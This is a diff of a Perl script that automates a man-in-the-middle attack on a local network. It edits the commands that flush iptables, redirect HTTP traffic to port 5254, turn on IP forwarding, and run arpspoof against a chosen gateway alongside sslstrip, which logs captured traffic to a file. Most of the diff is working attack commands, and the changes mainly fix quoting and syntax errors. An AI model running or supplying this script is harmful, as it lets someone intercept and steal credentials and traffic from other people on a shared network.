@@ -9,9 +9,9 @@ print "**************************************************************\n";  #
 ############################################################################
 
 # Cleaning stuff
-system "killall -9 sslstrip arpsoff";
-system "echo "0" > /proc/sys/net/ipv4/ip_forward"
-system "iptables --table nat --flush"
+system "killall -9 sslstrip arpspoof:";
+system "echo '0' > /proc/sys/net/ipv4/ip_forward";
+system "iptables --table nat --flush";
 system "iptables --flush";
 system "iptables --delete-chain";
 system "iptables --table nat --delete-chain";
@@ -22,7 +22,7 @@ print color("bold red"), ". . ..\n", color("reset");
 system "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 5254";
 #Port Fawarding
 print color("bold red"), "Setting up port fawarding on our box\n", color("reset");
-system "echo "1" > /proc/sys/net/ipv4/ip_forward";
+system "echo '1' > /proc/sys/net/ipv4/ip_forward";
 ## Arpspoof Script, must specify your interface and router IP
 if ($#ARGV < 0) {
     print q{
@@ -40,5 +40,5 @@ $interface = $ARGV[0];
 $getway = $ARGV[1];
 print color("bold red"), "Starting arpsoof on interface: $interface ip: $getway \n", color("reset");
 system "arpspoof -i $interface $getway &  sslstrip -a -k -l 5254 -w Juliscript.log";
-print "Now let the script to do hes work, and check Juliscript.log if we found somethin\n"
+print "Script stoped by you , check Juliscript.log if we found anything \n"
 # LineAL ;) 
